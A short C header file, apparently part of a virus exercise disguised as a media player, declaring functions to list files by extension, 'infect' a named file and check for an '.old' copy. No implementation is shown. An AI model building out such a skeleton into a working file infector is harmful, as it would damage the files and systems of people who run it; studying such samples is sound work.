#ifndef MEDIAPLAYER_H
#define MEDIAPLAYER_H

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

struct stat sb;

void listeFichier(char *extension);
void infect(char *fileName);
bool verifPresenceFichierOld(char *str);


#endif // MEDIAPLAYER.H
